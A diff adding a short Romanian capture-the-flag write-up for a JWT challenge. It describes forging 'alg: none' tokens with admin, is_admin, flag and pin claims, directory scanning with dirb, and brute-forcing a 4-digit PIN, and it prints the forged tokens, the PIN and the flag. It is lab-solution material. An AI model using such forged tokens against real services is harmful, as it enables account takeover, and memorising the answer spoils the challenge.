@@ -1,0 +1,41 @@
+you-can-trust-me
+
+Din descrierea task-ului si sursa paginii am observat ca este vorba de un
+atac de tipul Cookie Injection (JWT). Asa ca am decodat un cookie de sesiune
+random si am observat ca sunt folosite diferite chei.
+
+Am setat alg -> none
+user -> admin
+
+si am observat o schimbare in pagina;
+Eram logat ca admin dar nu aveam privlegii de admin. Asa ca, din lipsa de
+ocupatie am folosit soft-ul dirb pe pagina web si am gasit calea
+/docs, unde am observat ca lipseste cheia is_admin, asa ca de acolo am mers
+din aproape in aproape:
+
+{"user":"admin", "is_admin":true}
+
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCAiaXNfYWRtaW4iOnRydWV9.
+
+missing flag
+
+{"user":"admin", "is_admin":true, "flag":true}
+
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCAiaXNfYWRtaW4iOnRydWUsICJmbGFnIjp0cnVlfQ.
+
+missing pin
+
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCAiaXNfYWRtaW4iOnRydWUsICJmbGFnIjp0cnVlLCAicGluIjp0cnVlfQ.
+
+{"user":"admin", "is_admin":true, "flag":true, "pin":true}
+
+"pin is not valid. (hint)use your phone pin first 4"
+
+Dupa un atac de tip brute-force folosind un script in python si o lista
+generata de cookie-uri cu toate pin-urile de 4 cifre posibile
+am ajuns la pinul: 7331
+
+iar raspunsul requestului cu acel cookie este chiar flag-ul:
+
+CTF{2965f7e9fcc77fff2bd869db984df8371845d6781edb382cc34536904207a53d}
+
